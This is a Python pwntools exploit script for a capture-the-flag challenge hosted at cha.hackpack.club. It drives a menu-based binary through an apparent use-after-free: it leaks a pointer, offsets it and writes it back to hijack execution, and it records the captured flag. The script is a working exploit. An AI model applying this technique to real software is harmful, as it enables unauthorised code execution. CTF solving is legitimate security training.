#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template chal --host cha.hackpack.club --port 41705
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('chal')
pty = process.PTY
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41705)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, stdout=pty, stdin=pty, *a, **kw)
    if args.EDB:
        return process(["edb", "--run", exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)
    else:
        return process([exe.path] + argv, stdout=pty, stdin=pty, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.recvuntil(b'Choose option:')
io.sendline(b'1')
io.recvuntil(b'Enter index of new number (0-9):')
io.sendline(b'0')
io.recvuntil(b'Enter object name:')
io.sendline(b'test')
io.recvuntil(b'Enter number:')
io.sendline(b'10')

io.recvuntil(b'Choose option:')
io.sendline(b'2')
io.recvuntil(b'Enter index of number to delete (0-9):')
io.sendline(b'0')

io.recvuntil(b'Choose option:')
io.sendline(b'6')

io.recvuntil(b'Choose option:')
io.sendline(b'4')
io.recvuntil(b'Select index of number to print (0-9):')
io.sendline(b'0')
io.recvline(1)
jmp = io.recvline(1)
payload = hex(int(jmp[:-1])-19)

io.recvuntil(b'Choose option:')
io.sendline(b'3')
io.recvuntil(b'Enter index of number to edit (0-9):')
io.sendline(b'0')
io.recvuntil(b'Enter new number:')
io.sendline(f"{int(payload, 16)}")

io.recvuntil(b'Choose option:')
io.sendline(b'6')
io.interactive()

# flag{n3v3r_tru5t_fr33_jVmVsEuj}